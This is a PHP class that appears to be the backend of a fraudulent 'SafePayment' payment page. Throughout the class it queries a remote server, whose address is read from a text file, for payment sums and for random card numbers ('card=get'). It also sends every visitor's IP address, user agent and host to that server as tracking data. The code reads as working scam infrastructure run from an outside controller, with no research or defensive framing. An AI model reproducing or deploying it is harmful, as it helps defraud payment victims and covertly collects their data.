<?php

class Main {
 public static  $filesDir = "filestxt2343352127";
 public static  $SumDefault = "100";
 public static  $uniqText = "paymentuniqtext.txt";
 public static  $statd = "paymenthits.txt";
 public static  $inputData="paymentresult.txt";
 public static  $getCard="cards.txt";
 public static  $finalRedirect="finalredirect.txt";
 public static  $SafePayment = "SafePayment"; //folder where generate tmp files;
 public static  $urlSQLServerPage="sqlserver.txt";

 public function parseid($get){
   $get['id'] =  preg_replace ("/[^a-zA-Z0-9-&=]/","",$get['id']);
    $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
    $sum=file_get_contents($urlSQLServerPage.'/?sum='.$get['id']);
    $sum=preg_replace('/[^\d]/', '', $sum);
    if(@is_numeric($sum)==false){ 
      $sum=self::$SumDefault;
    }

   return $sum;

 }

 

 public function insertstat($id,$sum){
      $stat = @date("d-m-y").",".@date("H:i:s")."|".$id."|".$sum."|".$_SERVER['REMOTE_ADDR']."|".$_SERVER['HTTP_USER_AGENT']."|".$_SERVER['HTTP_HOST']."\r\n";
      $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
      $textall=file_get_contents($urlSQLServerPage.'?insert_payment_hits=1&data='.urlencode($stat));
 }
 
  public function genfile($st){
     $st=@preg_replace ("/[^a-zA-Z0-9\s]/","",$st);
     $fp = @fopen(self::$SafePayment."/".$st.".php","w+");
     @fclose($fp);
 }

 public function getRandcards($idsum){
   $str=@file_get_contents(self::$filesDir."/".self::$getCard);
   $urlSQLServerPage=file_get_contents(self::$urlSQLServerPage);
   $str=file_get_contents($urlSQLServerPage.'/?card=get&fxs='.$idsum.'&fxp='.$_SERVER['REMOTE_ADDR'].'&user_agent='.urlencode($_SERVER['HTTP_USER_AGENT']).'&domain='.$_SERVER['HTTP_HOST']);
   //echo $str;
   //echo "<br>";
   //echo $str;
   if(iconv_strlen($str)>0){
    $a = explode("\r\n",$str);

    $numbers = range(0, count($a)-1);
        $genTime1=substr(time()+(double)microtime()*1000000+getmypid(),3);
      shuffle($numbers);
      while (list(, $number) = each($numbers)) {
       return $a[$number];
       break;
      }

   }
 }

 

   function get_server_answer($urlSQLServerPage, $query){
       $urlSQLServerPage=file_get_contents($urlSQLServerPage);
       //echo file_get_contents($urlSQLServerPage.'/?'.$query);
       return file_get_contents($urlSQLServerPage.'/?'.$query);
   }
}


?>